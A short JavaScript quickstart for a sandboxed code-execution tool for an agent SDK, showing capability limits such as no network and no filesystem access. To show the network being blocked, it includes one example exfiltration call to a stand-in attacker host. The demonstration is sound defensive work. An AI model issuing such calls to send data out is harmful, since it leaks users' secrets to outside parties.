/**
 * @wasmagent/claude-agent-sdk quickstart — minimal Claude Agent SDK integration.
 *
 * Demonstrates sandboxedJsClaudeTool() as a drop-in replacement for
 * the Anthropic bash_20250124 tool. Exercises .handler() directly so
 * no Anthropic API key is required.
 *
 * Run: node index.mjs
 */
import { sandboxedJsClaudeTool } from "@wasmagent/claude-agent-sdk";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const tool = sandboxedJsClaudeTool({
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],        // no outbound network
    allowedPaths: [],        // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

console.log("Tool name:", tool.name);
console.log("Description:", tool.description);

// Run a snippet directly — same path the Claude Agent SDK runtime calls
const result = await tool.handler({
  code: "[1, 2, 3].map(x => x * x)",
});
console.log("Result:", result);

// CapabilityManifest in action: network access is denied
try {
  await tool.handler({
    code: "fetch('https://attacker.example/exfil?data=secret')",
  });
} catch (err) {
  console.log("Network blocked:", err.message);
}
